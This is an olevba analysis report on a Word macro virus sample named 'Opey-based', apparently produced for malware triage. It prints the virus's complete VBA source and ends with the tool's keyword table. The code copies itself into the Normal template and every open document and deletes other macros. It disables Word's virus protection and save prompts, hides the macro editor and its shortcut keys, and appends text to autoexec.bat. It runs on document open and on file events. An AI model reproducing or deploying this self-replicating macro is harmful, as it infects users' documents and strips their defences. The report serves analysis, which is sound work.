olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-7690ff5236f9cbddd663bd66f59b30f49179c914
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-7690ff5236f9cbddd663bd66f59b30f49179c914 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Killer_V.bas 
in file: Virus.MSWord.Opey-based-7690ff5236f9cbddd663bd66f59b30f49179c914 - OLE stream: 'Macros/VBA/Killer_V'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
        line2$ = " Thanks to the Opey Creator. This one is for you! hehehe, hope you like it"
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo Maligayang Pasko at Manigong bagong taon !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo Maligayang Araw ng mga Patay !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 2) Then
                line1$ = "echo Maligayang Araw ng Kaluluwa at maligayang kaarawan kay a.m. !!!"
            End If
            If (Month(Date) = 9) And (Day(Date) = 22) Then
                line1$ = "echo Maligayang kaarawan kay mama !!!"
            End If
            If (Month(Date) = 9) And (Day(Date) = 20) Then
                line1$ = "echo Maligayang kaarawan kay r.l. !!!"
            End If
            If (Month(Date) = 7) And (Day(Date) = 13) Then
                line1$ = "echo Maligayang kaarawan sa iyo mahal ko - m.v. !!!"
            End If
            If (Month(Date) = 7) And (Day(Date) = 10) Then
                line1$ = "echo Maligayang kaarawan kay marts !!!"
            End If
            If (Month(Date) = 5) And (Day(Date) = 31) Then
                line1$ = "echo Maligayang kaarawan kay papa !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 19) Then
                line1$ = "echo Maligayang kaarawan kay winong !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo Maligayang araw ng mga puso !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, line2$
                        Print #hFile, "echo Mula kay Killer V"
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub Hacked()
  On Error Resume Next
    Call Killer_V
    NTInfected = False
        For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "Killer_V" Then NTInfected = True
                If (clan <> "Killer_V") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next I
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "Killer_V" Then ODInfected = True
                    If (clan <> "Killer_V") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Killer_V", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Killer_V", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub Killer_V()
    On Error Resume Next
    Application.UserName = "Killer V"
    Application.UserAddress = "PHILIPPINES 99"
    Application.UserInitials = "Killer V"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Killer V"
        .Title = "SCP - Starcraft Certified Professional"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call Hacked
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Hacked
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Hacked
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call Hacked
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Hacked
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Hacked
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call Hacked
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Hacked
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Hacked
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Hacked
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

